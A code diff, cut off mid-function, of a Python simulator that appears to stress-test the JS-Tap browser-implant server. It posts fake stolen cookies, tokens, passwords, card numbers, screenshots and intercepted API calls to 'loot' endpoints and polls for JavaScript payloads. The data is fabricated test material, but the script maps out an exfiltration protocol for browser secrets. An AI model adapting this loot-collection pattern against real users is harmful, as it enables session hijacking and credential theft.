@@ -1,290 +1,424 @@
-#!usr/bin/env python
-import json
-import asyncio
-import aiohttp
-import time
-import random
-import requests
-import base64
+#!/usr/bin/env python3
+"""JS-Tap Client Simulator
 
-
-# Script to simulate clients sending in loot
-# To stress test the system, see how well it
-# holds up
-
-
-numClients = 3
-
-
-randStartRange = 1
-randEndRange   = 10
-
-
-apiServer = "https://100.115.92.203:8444/"
-victimApp = "https://vulnerableapp.com"
-
-
-
-
-fakeHtml = """
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum malesuada mollis pretium. Sed ut faucibus nulla, euismod blandit lacus. Etiam dolor libero, pulvinar tristique pharetra non, porttitor vitae enim. Vestibulum fermentum, tellus at tempor blandit, sapien orci dignissim libero, et malesuada ligula metus posuere nisi. Nullam a gravida mauris. Aliquam tortor massa, dapibus nec scelerisque non, faucibus ut dolor. Ut id tincidunt purus, et ultrices arcu.
-
-Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Vivamus dictum elit non ultricies placerat. Aenean eleifend justo nec leo tincidunt malesuada. Vivamus tellus massa, posuere at odio a, consequat venenatis ligula. Quisque vel ante vel diam hendrerit pellentesque. In hac habitasse platea dictumst. Integer nec magna vitae augue viverra tincidunt. Donec scelerisque eleifend rhoncus.
-
-Phasellus tincidunt nulla urna, sit amet pellentesque purus dictum id. Ut eget augue congue, pellentesque magna et, bibendum velit. Donec et magna ut diam congue rhoncus sit amet a nisl. Proin consectetur vel urna sed ornare. Praesent odio leo, pellentesque eu ullamcorper at, vestibulum ac libero. Aliquam finibus mollis sagittis. Aliquam fermentum finibus est, sed varius purus consectetur vel. Curabitur vitae efficitur felis. Nullam imperdiet enim ut mauris scelerisque laoreet. Phasellus egestas purus quis leo mollis, in sollicitudin dui ornare. Praesent laoreet aliquam eros vel suscipit.
-
-Integer sed pretium massa. Sed eget diam magna. Cras ultricies imperdiet vestibulum. Maecenas mattis purus vitae arcu semper, et commodo tortor pellentesque. In hac habitasse platea dictumst. Sed pharetra dictum velit vitae viverra. Ut erat sapien, placerat quis ex sit amet, dignissim vestibulum tortor. Fusce convallis, mi elementum volutpat rhoncus, magna urna vulputate felis, a finibus mi elit vel lectus. Mauris auctor lacinia nibh, posuere interdum mauris imperdiet id. Vivamus sagittis risus et est lobortis, eget sodales urna imperdiet. Nunc a risus at diam porta feugiat ac quis orci. In accumsan, quam posuere laoreet interdum, magna est blandit mauris, et sodales metus dolor non est. Pellentesque non quam enim.
-
-Nulla ante mauris, bibendum a dolor at, viverra posuere tellus. Ut dignissim pellentesque metus. Ut ut euismod nisl. Cras diam leo, elementum at massa non, tristique placerat nulla. Nunc ut sapien efficitur, ultrices lectus ac, pretium sem. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec nec sodales eros, at eleifend magna. Sed pellentesque sodales risus porta molestie. Phasellus egestas odio eget elit iaculis, vel varius libero malesuada. Maecenas maximus fermentum augue. Donec finibus volutpat rhoncus. Vestibulum nec tincidunt libero. Integer sit amet velit vel nisi auctor pellentesque. Vestibulum dolor dolor, consectetur at urna a, luctus suscipit dolor. Integer turpis leo, scelerisque sit amet diam vel, semper euismod sapien. Donec cursus risus in dolor ultrices, eu pharetra ex gravida.
-
-Duis eu ipsum at enim gravida lacinia. Mauris sapien lorem, tincidunt at convallis in, convallis auctor augue. Suspendisse at mi efficitur, auctor risus ac, accumsan tortor. Aenean vel neque nunc. Ut ut dui metus. In sodales magna at libero sodales, sit amet ornare est varius. Nam ac finibus odio. Curabitur non consectetur eros. Sed dolor augue, sodales non ligula a, aliquet placerat lectus. Nunc molestie ligula et ligula tincidunt, eget porttitor ipsum egestas. Morbi id consectetur erat. Nunc porttitor porta commodo.
-
-Aenean augue orci, tincidunt vestibulum pharetra eu, molestie id tellus. Aenean condimentum ipsum at est feugiat dapibus. In sit amet lectus vel ex malesuada bibendum. Cras consequat sem id felis feugiat, eget suscipit tortor placerat. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla sit amet ligula vel ipsum interdum ullamcorper. Nunc eget sodales nisl. Quisque vel tempus mi.
-
-Donec vulputate nibh non placerat rhoncus. Etiam placerat blandit leo nec sagittis. Aliquam gravida tortor ac ex mollis, vitae iaculis ligula elementum. Donec venenatis, magna feugiat suscipit tempor, mi magna facilisis velit, ac aliquet nisi nisi quis turpis. Suspendisse fringilla rutrum lectus, sed tempus ligula pellentesque vel. Donec risus massa, luctus in dolor at, finibus gravida ipsum. Integer finibus at diam et aliquam. Suspendisse at tincidunt tellus. Sed sed tortor id lacus ultricies aliquet ut eget lacus. Suspendisse sollicitudin feugiat dui, luctus scelerisque magna pretium nec. In vel lorem consequat, pellentesque ex ac, malesuada quam. Nam lobortis vel odio quis rhoncus. Donec sit amet risus vulputate, pulvinar orci eu, ultricies justo. In diam leo, consectetur et est sed, interdum consequat augue. Pellentesque accumsan ac nunc non rutrum. Nunc leo nibh, finibus eget eleifend quis, fermentum sed odio.
-
-Sed efficitur pulvinar sodales. Morbi faucibus metus ipsum, in tempor nunc sagittis eu. Vivamus odio quam, fringilla eu mi a, fermentum efficitur tortor. Aenean non imperdiet lacus, ut condimentum dolor. Donec ipsum dui, consectetur vel nunc tempus, bibendum maximus felis. Vivamus ultrices dui erat, non tempor mi tincidunt sed. Sed gravida porttitor quam eget convallis. Duis quis velit eu eros varius convallis. Nullam sollicitudin consequat quam at lacinia. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Proin quis magna vel ante condimentum commodo ac suscipit lectus.
-
-Pellentesque condimentum tristique suscipit. Quisque tempor diam dui, id bibendum purus faucibus a. Maecenas ac nulla tempor, condimentum est sed, faucibus purus. Nunc sit amet ligula in augue euismod varius ultrices a est. Duis dignissim ipsum sed arcu tincidunt efficitur. Pellentesque iaculis elementum laoreet. Phasellus lobortis suscipit arcu, vitae sagittis tellus accumsan a. Vivamus tincidunt egestas diam vel condimentum. Donec a ex sollicitudin lorem viverra tempus eu at nunc. Nulla facilisi. Suspendisse interdum, nunc semper commodo accumsan, metus sapien faucibus nulla, at pharetra sapien orci non erat. Nam tristique, dolor id commodo ornare, justo dolor porttitor turpis, in porttitor eros massa at felis. Mauris ultrices ultricies lorem, at maximus urna accumsan et. Praesent pulvinar tincidunt odio nec pellentesque. Nulla facilisi. Praesent nec diam vitae purus condimentum tincidunt.
-
-Quisque convallis lacus ac sagittis commodo. In hac habitasse platea dictumst. Nulla id est arcu. Sed diam tortor, viverra vel pellentesque nec, varius id nunc. In rhoncus, enim et ultricies semper, purus ligula ultrices eros, non sollicitudin ex turpis eget ipsum. Integer lacinia enim eget magna condimentum, non pharetra diam pulvinar. Donec vehicula justo euismod pharetra faucibus. Quisque faucibus sapien convallis, tempor augue quis, hendrerit felis. Cras vestibulum pretium libero, vel mollis diam ultrices vel. Nunc id eros pellentesque, dictum nisi laoreet, varius justo. Pellentesque velit nisi, iaculis ac arcu et, fermentum semper velit. Suspendisse potenti. Donec pellentesque mauris at nulla venenatis, ac blandit lectus placerat. Mauris metus tellus, ultrices id pulvinar vitae, vulputate non purus.
-
-Etiam malesuada lacus nec congue dignissim. Praesent commodo, lorem a tristique tristique, massa leo rhoncus arcu, sit amet faucibus sem nisl pretium leo. Donec non aliquet mi. Vestibulum sed orci sit amet enim fringilla sollicitudin. Proin in tristique metus. Aliquam erat volutpat. Vivamus tincidunt felis et congue cursus. Vivamus ac metus ut eros fermentum semper a eget risus. Aliquam erat volutpat. Pellentesque dignissim justo vitae neque tristique dictum.
-
-Aenean eu tempus odio. Phasellus vitae egestas arcu. Phasellus volutpat urna non enim sodales vehicula. Morbi imperdiet nisl dictum lacus porttitor, eu rhoncus tellus tristique. Aliquam id posuere ante, ac faucibus lorem. Sed id turpis nec enim ultricies tempor sed non nibh. Nullam quis diam quis diam eleifend tempor. Interdum et malesuada fames ac ante ipsum primis in faucibus. Etiam consequat nulla eu dictum tincidunt. Donec convallis mauris sed quam pulvinar, ac porta mauris semper. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Etiam imperdiet neque ut metus convallis, scelerisque laoreet leo lacinia. Aenean rhoncus urna pretium mauris euismod ultricies. Donec euismod bibendum sapien non aliquam. Maecenas fringilla dignissim purus, et consequat lectus consequat ac. Morbi efficitur dolor eget tincidunt egestas.
-
-Integer mi dui, semper at mollis eu, interdum eu dui. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vivamus at est nec urna mollis faucibus sit amet vel urna. Quisque porttitor lacus non pharetra facilisis. Etiam sed varius mi. Integer vel posuere lacus, et pellentesque lectus. Curabitur in interdum orci. Sed nec ultricies diam, et malesuada nisi. Fusce ornare varius dui sed mattis. Etiam ultricies arcu ac libero condimentum, sed ultricies ligula placerat. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vivamus mattis commodo convallis. Donec et iaculis justo. Etiam vel lorem non purus gravida facilisis et a tortor. Morbi nec ante ornare, tincidunt mi et, ultricies mi. Ut sit amet iaculis ligula, et pulvinar mauris.
-
-Duis eget egestas massa. Donec consectetur pellentesque urna, vel gravida orci rhoncus non. Nam eget neque eget tellus commodo tincidunt nec sed neque. Sed purus sapien, bibendum facilisis lacinia vitae, commodo a elit. Cras iaculis purus ut tristique bibendum. Aliquam erat volutpat. Nunc risus dolor, dapibus eu sem vel, fringilla tincidunt felis. Nam tristique aliquet orci, vel ornare nibh sagittis non.
-
-Nullam eget sagittis erat, sed sagittis risus. Vestibulum suscipit, elit eu placerat interdum, lorem lorem interdum est, eu cursus turpis neque eu orci. Quisque ac varius nisl, vitae pellentesque leo. Donec feugiat turpis in tempor ultricies. Nunc elementum mollis tellus, et faucibus leo dictum vitae. Sed non purus tincidunt, dignissim magna varius, imperdiet arcu. Sed scelerisque auctor aliquet. Mauris in arcu convallis, hendrerit lectus vel, vulputate neque. Ut elit lorem, pharetra venenatis est ut, auctor pellentesque sem. Fusce venenatis velit ut turpis pharetra condimentum. Nam vel turpis leo. Etiam aliquet leo nec libero vulputate vestibulum. Nullam sagittis augue ut sapien venenatis feugiat. Aenean eu neque sit amet neque finibus fringilla et sit amet sem.
-
-Proin tincidunt, elit eu bibendum rutrum, ex dolor feugiat mauris, eget ultricies tortor augue id est. Mauris non turpis odio. Nam nec viverra sem. Duis ultricies molestie elit vel mattis. Donec libero tortor, fringilla sit amet vestibulum sed, blandit sed massa. Nulla facilisi. Nulla odio turpis, lobortis non turpis sit amet, cursus viverra sem. Integer venenatis at lectus ut commodo. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae;
-
-Aenean tempus nisl diam, ullamcorper pellentesque purus aliquam eget. Nullam lacus tortor, tempor at magna at, tincidunt hendrerit urna. Maecenas commodo luctus consectetur. In imperdiet pulvinar magna a bibendum. Praesent quis interdum nulla. Duis sit amet condimentum est, sed dictum massa. Ut non accumsan enim, at sodales nulla. Morbi sed nisi odio. Nam urna justo, ultrices a sodales et, viverra non dui. Phasellus cursus nisl nec placerat convallis. Ut imperdiet nulla tortor, volutpat consectetur nulla aliquam ut. Proin pretium pharetra libero sit amet posuere. Morbi rutrum mi non commodo convallis. Phasellus condimentum velit a laoreet elementum. Suspendisse lorem erat, imperdiet in nulla sit amet, aliquet tincidunt nibh. Sed consectetur ullamcorper mi non bibendum.
-
-Nunc pellentesque eu urna sed molestie. Cras mattis arcu justo, quis eleifend leo imperdiet iaculis. Cras purus odio, facilisis ac tellus in, finibus luctus odio. Donec sit amet ultrices odio. Pellentesque in lacus sapien. In porttitor velit nisl, quis interdum lacus fermentum nec. Ut sit amet magna ut purus interdum molestie. Fusce sollicitudin in neque eget laoreet. Maecenas eu urna sem. Maecenas quis ante varius, semper orci nec, aliquam ipsum. Donec et interdum lacus.
-
-Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Mauris dignissim vel augue id consequat. Quisque congue ex turpis, id ultrices augue tincidunt vel. Cras venenatis odio quam, quis vehicula urna pretium sed. Nullam iaculis fermentum dolor non maximus. In odio dolor, sollicitudin eu risus eu, cursus ornare tellus. Maecenas ullamcorper ligula at congue fringilla. Donec malesuada ligula at felis laoreet facilisis. Quisque tempus, eros ut blandit lacinia, risus mauris hendrerit purus, vitae finibus mauris lorem et nulla. Vestibulum urna erat, aliquam facilisis pulvinar dignissim, fringilla ac tortor. Nulla id justo vehicula, aliquam nisl sit amet, pulvinar lacus. Nulla eu tempus nunc, nec lobortis justo. Integer nec malesuada mi. Pellentesque porttitor tortor id leo viverra, et ultrices magna malesuada. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Maecenas mattis molestie turpis in sollicitudin. 
-
+Creates diverse fake clients, sends realistic loot, polls for custom payloads,
+and prints a live status grid. Useful for testing target rules, match filtering,
+autorun/repeat, and custom payload delivery.
 """
 
-
-with open('./clientSimulatorScreenshot.png', 'rb') as image_file:
-	screenshotData = image_file.read()
-
-
-
-class Client:
-	def __init__(self, client_id):
-		self.client_id = client_id
-		self.uuid      = None
-		self._running  = True
+import argparse
+import asyncio
+import aiohttp
+import base64
+import json
+import os
+import random
+import sys
+import time
 
 
-	async def initialize(self, session):
-		await self.getUUID(session)
-		print(f"Client {self.client_id} UUID: {self.uuid}")
+# ── User-Agent strings ─────────────────────────────────────────────────────────
+
+LINUX_CHROME_UA = (
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+)
+LINUX_FIREFOX_UA = (
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
+)
+WIN_CHROME_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+)
+WIN_EDGE_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
+)
+MAC_SAFARI_UA = (
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 "
+    "(KHTML, like Gecko) Version/17.2 Safari/605.1.15"
+)
+
+# ── Client profiles ────────────────────────────────────────────────────────────
+
+CLIENT_PROFILES = [
+    {"count": 3, "tag": "wp",    "user_agent": LINUX_CHROME_UA,  "label": "Linux/Chrome"},
+    {"count": 2, "tag": "wp",    "user_agent": LINUX_FIREFOX_UA, "label": "Linux/Firefox"},
+    {"count": 3, "tag": "admin", "user_agent": WIN_CHROME_UA,    "label": "Win/Chrome"},
+    {"count": 2, "tag": "admin", "user_agent": WIN_EDGE_UA,      "label": "Win/Edge"},
+    {"count": 2, "tag": "",      "user_agent": MAC_SAFARI_UA,    "label": "Mac/Safari"},
+]
+
+# ── Fake data pools ────────────────────────────────────────────────────────────
+
+FAKE_URLS = [
+    "https://targetapp.com/dashboard",
+    "https://targetapp.com/admin/users",
+    "https://targetapp.com/settings/profile",
+    "https://targetapp.com/api/v1/data",
+    "https://targetapp.com/login",
+    "https://targetapp.com/checkout",
+    "https://targetapp.com/account/billing",
+    "https://targetapp.com/reports/quarterly",
+]
+
+FAKE_COOKIES = [
+    ("PHPSESSID", "abc123def456"),
+    ("jwt_token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.fake"),
+    ("_session_id", "s3cr3t_s3ss10n_v4lu3"),
+    ("csrftoken", "9f2k4j8m3n1p5q7r"),
+    ("remember_me", "dXNlcjEyMzQ1Ng=="),
+    ("lang", "en-US"),
+]
+
+FAKE_LOCAL_STORAGE = [
+    ("authToken", "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQGNvcnAuY29tIn0.signature"),
+    ("userPrefs", '{"theme":"dark","lang":"en","notifications":true}'),
+    ("cartData", '[{"id":42,"name":"Widget","qty":2}]'),
+    ("lastLogin", "2025-12-15T08:30:00Z"),
+]
+
+FAKE_SESSION_STORAGE = [
+    ("csrfToken", "x9f2a7b4c1e8d3"),
+    ("tempAuth", "tmp_8k3m9n2p5q1r"),
+    ("wizardStep", "3"),
+    ("formDraft", '{"field1":"partial","field2":"data"}'),
+]
+
+FAKE_INPUTS = [
+    ("username", "admin"),
+    ("password", "hunter2"),
+    ("email", "user@corp.com"),
+    ("search", "confidential reports"),
+    ("credit_card", "4111-1111-1111-1111"),
+    ("ssn", "123-45-6789"),
+    ("api_key", "sk-proj-abc123def456"),
+]
+
+FAKE_HTML_SNIPPETS = [
+    '<html><head><title>Dashboard</title></head><body><div class="user-panel"><h1>Welcome, admin</h1><p>Last login: Dec 15, 2025</p><ul><li>Pending orders: 14</li><li>Revenue: $48,230</li></ul></div></body></html>',
+    '<html><head><title>User Management</title></head><body><table class="users"><tr><th>Name</th><th>Role</th></tr><tr><td>alice@corp.com</td><td>admin</td></tr><tr><td>bob@corp.com</td><td>user</td></tr></table></body></html>',
+    '<html><head><title>Settings</title></head><body><form id="profile"><input name="email" value="admin@corp.com"/><input name="phone" value="+1-555-0142"/><select name="role"><option selected>Super Admin</option></select></form></body></html>',
+    '<html><head><title>API Keys</title></head><body><div class="keys"><p>Production: sk-live-abc123</p><p>Staging: sk-test-def456</p><button>Regenerate</button></div></body></html>',
+]
+
+FAKE_XHR_CALLS = [
+    {
+        "method": "POST",
+        "url": "https://targetapp.com/api/v1/users",
+        "body": base64.b64encode(b'{"name":"newuser","role":"admin"}').decode(),
+        "responseBody": base64.b64encode(b'{"id":42,"status":"created"}').decode(),
+        "responseStatus": 201,
+        "headers": {"Authorization": "Bearer eyJhbG...", "Content-Type": "application/json"},
+    },
+    {
+        "method": "GET",
+        "url": "https://targetapp.com/api/v1/secrets",
+        "body": base64.b64encode(b'').decode(),
+        "responseBody": base64.b64encode(b'{"db_password":"p@ssw0rd!","api_key":"sk-secret-789"}').decode(),
+        "responseStatus": 200,
+        "headers": {"Authorization": "Bearer eyJhbG...", "X-API-Key": "internal-key-123"},
+    },
+    {
+        "method": "PUT",
+        "url": "https://targetapp.com/api/v1/config",
+        "body": base64.b64encode(b'{"debug":true,"maintenance":false}').decode(),
+        "responseBody": base64.b64encode(b'{"updated":true}').decode(),
+        "responseStatus": 200,
+        "headers": {"Authorization": "Bearer eyJhbG..."},
+    },
+]
+
+# ── Screenshot data ────────────────────────────────────────────────────────────
+
+SCREENSHOT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clientSimulatorScreenshot.png")
 
 
+# ── SimClient ──────────────────────────────────────────────────────────────────
 
-	async def run(self, session):
-		while self._running:
-			print("Client " + str(self.client_id) + " run loop")
+class SimClient:
+    def __init__(self, index, label, tag, user_agent, server):
+        self.index = index
+        self.label = label
+        self.tag = tag
+        self.user_agent = user_agent
+        self.server = server.rstrip("/")
+        self.uuid = None
+        self.payloads_received = []  # list of label strings
 
+    @property
+    def uuid_short(self):
+        if not self.uuid:
+            return "--------"
+        return f"{self.uuid[:4]}..{self.uuid[-4:]}"
 
-			# Need a pattern of behavior here
-			# URL change
-			# Storage/cookie change
-			# Screenshot
-			# HTML Scrape
-			# User Inputs
-			# API Calls
+    async def register(self, session):
+        tag_path = f"/{self.tag}" if self.tag else ""
+        url = f"{self.server}/client/getToken{tag_path}"
+        headers = {"User-Agent": self.user_agent}
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    self.uuid = data["clientToken"]
+                else:
+                    print(f"  [!] Client {self.index} registration failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Client {self.index} registration error: {e}")
 
+    async def send_loot_round(self, session):
+        if not self.uuid:
+            return
 
-			await self.urlEvent(session)
-			await self.cookieEvent(session)
-			time.sleep(0.1)
+        headers = {"User-Agent": self.user_agent}
+        base = self.server
 
-			await self.localStorageEvent(session)
-			time.sleep(0.05)
+        # URL
+        url = random.choice(FAKE_URLS)
+        await self._post_json(session, f"{base}/loot/location/{self.uuid}",
+                              {"url": url}, headers)
 
-			await self.sessionStorageEvent(session)
-			time.sleep(0.2)
+        # Cookies (1-2)
+        for name, value in random.sample(FAKE_COOKIES, random.randint(1, 2)):
+            await self._post_json(session, f"{base}/loot/dessert/{self.uuid}",
+                                  {"cookieName": name, "cookieValue": value}, headers)
 
-			await self.screenshotEvent(session)
-			await self.htmlEvent(session)
-			time.sleep(0.3)
-			
-			await self.userInputEvent(session)
-			await self.xhrOpenEvent(session)
-			await self.xhrSetHeaderEvent(session)
-			await self.xhrCallEvent(session)
-			time.sleep(0.1)
-			
-			await self.fetchSetupEvent(session)
-			await self.fetchHeaderEvent(session)
-			await self.fetchCallEvent(session)
+        # localStorage
+        key, value = random.choice(FAKE_LOCAL_STORAGE)
+        await self._post_json(session, f"{base}/loot/localstore/{self.uuid}",
+                              {"key": key, "value": value}, headers)
 
-			sleepAmount = random.randint(randStartRange, randEndRange)
-			print("Client " + str(self.client_id) + " waiting: " + str(sleepAmount))
-			time.sleep(sleepAmount)
+        # sessionStorage
+        key, value = random.choice(FAKE_SESSION_STORAGE)
+        await self._post_json(session, f"{base}/loot/sessionstore/{self.uuid}",
+                              {"key": key, "value": value}, headers)
 
+        # User inputs (1-2)
+        for name, value in random.sample(FAKE_INPUTS, random.randint(1, 2)):
+            await self._post_json(session, f"{base}/loot/input/{self.uuid}",
+                                  {"inputName": name, "inputValue": value}, headers)
 
-	async def getUUID(self, session):
-		print("Retrieving UUID")
-		async with session.get(f'{apiServer}/client/getToken', ssl=False) as response:
-			if response.status == 200:
-				data = await response.json()
-				self.uuid = data["clientToken"]
-			else:
-				print("Failed to receive UUID")
+        # HTML
+        html_snippet = random.choice(FAKE_HTML_SNIPPETS)
+        await self._post_json(session, f"{base}/loot/html/{self.uuid}",
+                              {"url": url, "html": html_snippet}, headers)
 
+        # Screenshot
+        await self._post_screenshot(session, f"{base}/loot/screenshot/{self.uuid}", headers)
 
-	async def cookieEvent(self, session):
-		print("Sending cookie...")
-		await session.post(f'{apiServer}/loot/dessert/{self.uuid}', json={
-			"cookieName": "cookieMonster",
-			"cookieValue": "goYum"
-			}, ssl=False)
+        # XHR call
+        xhr = random.choice(FAKE_XHR_CALLS)
+        await self._post_json(session, f"{base}/loot/xhrRequest/{self.uuid}", xhr, headers)
 
+    async def poll_tasks(self, session):
+        """Poll for payloads. Returns list of payload label strings."""
+        if not self.uuid:
+            return []
 
-	async def localStorageEvent(self, session):
-		print("Sending local storage event...")
-		await session.post(f'{apiServer}/loot/localstore/{self.uuid}', json={
-			"key": "localStorageKey",
-			"value": "localStorageSuperSecretJWTValue"
-			}, ssl=False)
+        headers = {"User-Agent": self.user_agent}
+        url = f"{self.server}/client/taskCheck/{self.uuid}"
+        new_payloads = []
 
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    # Response: [{"id": N, "data": "base64-js-code"}, ...]
+                    if isinstance(data, list):
+                        for task in data:
+                            code_b64 = task.get("data", "")
+                            try:
+                                code_text = base64.b64decode(code_b64).decode("utf-8", errors="replace")
+                            except Exception:
+                                code_text = code_b64
+                            # Extract a label from the code (first ~50 meaningful chars)
+                            label = self._extract_label(code_text)
+                            new_payloads.append(label)
+                            self.payloads_received.append(label)
+                            # Send ACK
+                            await self._ack_payload(session, code_text)
+        except Exception:
+            pass
 
-	async def sessionStorageEvent(self, session):
-		print("Sending session storage event...")
-		await session.post(f'{apiServer}/loot/sessionstore/{self.uuid}', json={
-			"key": "sessionStorageKey",
-			"value": "sessionStorageSuperSecretJWTValue"
-			}, ssl=False)
+        return new_payloads
 
+    async def _ack_payload(self, session, payload_code):
+        """ACK a received payload via customData endpoint."""
+        snippet = payload_code[:80].replace("\n", " ")
+        note_b64 = base64.b64encode(b"SimAck").decode()
+        data_b64 = base64.b64encode(f"Received: {snippet}".encode()).decode()
+        headers = {"User-Agent": self.user_agent}
+        await self._post_json(session, f"{self.server}/loot/customData/{self.uuid}",
+                              {"note": note_b64, "data": data_b64}, headers)
 
-	async def urlEvent(self, session):
-		print("Sending URL event...")
+    @staticmethod
+    def _extract_label(code_text):
+        """Extract a short label from JS payload code."""
+        # Try to find a comment like // name: ... or /* name */
+        for line in code_text.split("\n")[:5]:
+            stripped = line.strip()
+            if stripped.startswith("//"):
+                label = stripped.lstrip("/ ").strip()
+                if label:
+                    return label[:50]
+        # Fall back to first non-empty line
+        for line in code_text.split("\n"):
+            stripped = line.strip()
+            if stripped:
+                return stripped[:50]
+        return "(empty payload)"
 
-		await session.post(f'{apiServer}/loot/location/{self.uuid}', json={
-			"url": victimApp + "/totesDashboard"
-			}, ssl=False)
+    @staticmethod
+    async def _post_json(session, url, payload, headers):
+        try:
+            async with session.post(url, json=payload, headers=headers, ssl=False) as resp:
+                pass
+        except Exception:
+            pass
 
-
-	async def htmlEvent(self, session):
-		print("Sending HTML event...")
-		await session.post(f'{apiServer}/loot/html/{self.uuid}', json={
-			"url": victimApp + "/totesDashboard",
-			"html": fakeHtml
-			}, ssl=False)
-
-	async def screenshotEvent(self, session):
-		print("Sending screenshot event...")
-
-		headers = {'Content-Type': 'image/png'}
-		async with session.post(f'{apiServer}/loot/screenshot/{self.uuid}', 
-             data=screenshotData, 
-             headers=headers, 
-             ssl=False) as response:
-			print("Sent screenshot")
-
-	async def userInputEvent(self, session):
-		print("Sending user input event...")
-		await session.post(f'{apiServer}/loot/input/{self.uuid}', json={
-			"inputName": "secretPassword",
-			"inputValue": "MyVoiceIsMyPassport"
-			}, ssl=False)
-
-	async def xhrOpenEvent(self, session):
-		print("Sending XHR Open event...")
-		await session.post(f'{apiServer}/loot/xhrOpen/{self.uuid}', json={
-			"method": "POST",
-			"url": victimApp + "/sensitiveAPI/secretShit"
-			}, ssl=False)
-
-
-
-	async def xhrSetHeaderEvent(self, session):
-		print("Sending XHR Header Event...")
-		await session.post(f'{apiServer}/loot/xhrSetHeader/{self.uuid}', json={
-			"header": "Authorization",
-			"value": "SECRET_JWT_VALUE"
-			}, ssl=False)
-
-		await session.post(f'{apiServer}/loot/xhrSetHeader/{self.uuid}', json={
-			"header": "RandomHeader",
-			"value": "SomethingOrAnother"
-			}, ssl=False)
-
-
-
-	async def xhrCallEvent(self, session):
-		print("Sending XHR call event...")
-
-		requestString  = "{'something':'something value', 'something else': 'some other value'}"
-		responseString = "{'responseSomethin201g':'something value', 'responseSomething else': 'some other value'}"
-
-		requestBody  = base64.b64encode(requestString.encode())
-		responseBody = base64.b64encode(responseString.encode())
-
-		await session.post(f'{apiServer}/loot/xhrCall/{self.uuid}', json={
-			"requestBody": requestBody.decode(),
-			"responseBody": responseBody.decode()
-			}, ssl=False)
-
-
-	async def fetchSetupEvent(self, session):
-		print("Sending Fetch Setup Event...")
-		await session.post(f'{apiServer}/loot/fetchSetup/{self.uuid}', json={
-			"method": "POST",
-			"url": victimApp + "/sensitiveAPI/fetchSecretShit"
-			}, ssl=False)
+    async def _post_screenshot(self, session, url, headers):
+        try:
+            with open(SCREENSHOT_PATH, "rb") as f:
+                img_data = f.read()
+            hdrs = {**headers, "Content-Type": "image/png"}
+            async with session.post(url, data=img_data, headers=hdrs, ssl=False) as resp:
+                pass
+        except Exception:
+            pass
 
 
+# ── StatusGrid ─────────────────────────────────────────────────────────────────
+
+class StatusGrid:
+    def __init__(self, clients):
+        self.clients = clients
+        self._lines_printed = 0
+
+    def render(self, last_poll_time=None):
+        """Clear previous output and reprint the status grid."""
+        # Move cursor up to overwrite previous grid
+        if self._lines_printed > 0:
+            sys.stdout.write(f"\033[{self._lines_printed}A\033[J")
+
+        lines = []
+        bar = "\u2550" * 71
+        thin = "\u2500" * 71
+
+        total_payloads = sum(len(c.payloads_received) for c in self.clients)
+        registered = sum(1 for c in self.clients if c.uuid)
+
+        lines.append(f"\u2550{bar}")
+        lines.append(f"  JS-Tap Client Simulator{' ' * 24}{registered} clients registered")
+        lines.append(f"\u2550{bar}")
+        lines.append(f"  {'#':>2}  {'Label':<14} {'Tag':<7} {'UUID':<12} Payloads Received")
+        lines.append(f" \u2500{thin}")
+
+        for c in self.clients:
+            payloads_str = ", ".join(c.payloads_received) if c.payloads_received else ""
+            # Truncate if too long
+            if len(payloads_str) > 40:
+                payloads_str = payloads_str[:37] + "..."
+            lines.append(
+                f"  {c.index:>2}  {c.label:<14} {c.tag:<7} {c.uuid_short:<12} {payloads_str}"
+            )
+
+        lines.append(f" \u2500{thin}")
+        poll_str = time.strftime("%H:%M:%S", time.localtime(last_poll_time)) if last_poll_time else "--:--:--"
+        lines.append(f"  Last poll: {poll_str}  |  Total payloads delivered: {total_payloads}")
+        lines.append(f"\u2550{bar}")
+
+        output = "\n".join(lines)
+        print(output)
+        self._lines_printed = len(lines)
 
 
-	async def fetchHeaderEvent(self, session):
-		print("Sending Fetch Header Event...")
-		await session.post(f'{apiServer}/loot/fetchHeader/{self.uuid}', json={
-			"header": "Authorization",
-			"value":"SECRET_JWT_VALUE"
-			}, ssl=False)
+# ── Main ───────────────────────────────────────────────────────────────────────
 
-
-	async def fetchCallEvent(self, session):
-		print("Sending Fetch Call Event...")
-
-		requestString  = "{'something':'fetchSomething value', 'something else': 'fetch some other value'}"
-		responseString = "{'responseSomething':'something value', 'responseSomething else': 'some other value'}"
-
-		requestBody  = base64.b64encode(requestString.encode())
-		responseBody = base64.b64encode(responseString.encode())
-
-		await session.post(f'{apiServer}/loot/fetchCall/{self.uuid}', json={
-			"requestBody": requestBody.decode(),
-			"responseBody": responseBody.decode()
-			}, ssl=False)
-
+def build_clients(server):
+    """Build the list of SimClient instances from CLIENT_PROFILES."""
+    clients = []
